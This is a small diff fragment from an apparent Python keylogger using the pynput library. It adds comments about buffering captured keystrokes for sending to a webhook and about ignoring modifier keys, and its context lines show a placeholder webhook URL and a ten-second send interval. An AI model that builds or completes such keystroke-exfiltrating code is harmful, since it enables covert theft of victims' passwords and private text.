@@ -7,8 +7,10 @@ from pynput import keyboard
 WEBHOOK_URL = 'YOUR_WEBHOOK_URL'
 INTERVAL = 10  # Time interval in seconds
 
+# Gets the array ready to be sent to webhook
 text_buffer = []
 
+# Adding those keys which are going to be ignored to prevent array disorder
 IGNORED_KEYS = {keyboard.Key.shift, keyboard.Key.shift_l, keyboard.Key.shift_r,
                 keyboard.Key.ctrl, keyboard.Key.ctrl_l, keyboard.Key.ctrl_r,
                 keyboard.Key.enter}
